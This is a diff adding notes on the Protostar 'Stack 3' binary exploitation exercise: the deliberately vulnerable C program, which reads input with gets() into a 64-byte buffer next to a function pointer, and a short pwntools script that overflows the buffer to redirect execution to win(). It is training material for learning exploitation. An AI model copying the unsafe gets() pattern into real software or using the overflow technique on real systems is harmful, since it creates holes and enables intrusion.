@@ -87,4 +87,44 @@ Notes while learning binary exploitation from protostar
 
 
 ## Stack 3
+- Source Code
+	```c
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <string.h>
 
+	void win()
+	{
+		printf("code flow successfully changed\n");
+	}
+
+	int main(int argc, char **argv)
+	{
+		volatile int (*fp)();
+		char buffer[64];
+
+		fp = 0;
+
+		gets(buffer);
+
+		if(fp) {
+				printf("calling function pointer, jumping to 0x%08x\n", fp);
+				fp();
+		}
+	}
+	```
+- Answer
+	```python
+	#!/bin/python
+	from pwn import *
+	pad = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaa'
+	eip = b'\x24\x84\x04\x08'#0x08048424
+	payload = pad+eip
+
+	p = process('./stack3')
+	p.sendline(payload)
+	print(p.recvline())
+
+	print(p.recvline())
+	```
